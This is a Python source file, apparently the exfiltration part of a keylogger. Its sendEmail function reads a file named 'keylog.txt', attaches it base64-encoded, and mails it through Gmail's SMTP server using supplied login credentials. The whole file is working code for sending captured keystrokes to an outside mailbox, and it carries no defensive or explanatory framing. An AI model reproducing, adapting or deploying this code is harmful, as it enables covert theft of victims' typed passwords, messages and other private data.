import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 

# All of the parameters are for the sender and receiver section of the message
def sendEmail(fromAddress, fromPassword, toAddress):
	
	subject = "This is the subject of the message"
	body = "This is the body of the message"

	# Construction of the email message with MIMEMultipart
	msg = MIMEMultipart() 
	msg['From'] = fromAddress
	msg['To'] = toAddress 
	msg['Subject'] = subject
	msg.attach(MIMEText(body, 'plain'))
	filename = "keylog.txt"
	attachment = open("keylog.txt", "rb")
	p = MIMEBase('application', 'octet-stream')
	p.set_payload((attachment).read())
	encoders.encode_base64(p) 
	p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
	msg.attach(p)

	# This sets up the connection to gmail
	# This is not going to be the same for different mailing servers
	s = smtplib.SMTP('smtp.gmail.com', 587)
	s.starttls() 
	s.login(fromAddress, fromPassword)
	text = msg.as_string()

	# Sends the message created above
	s.sendmail(fromAddress, toAddress, text) 
	s.quit() 
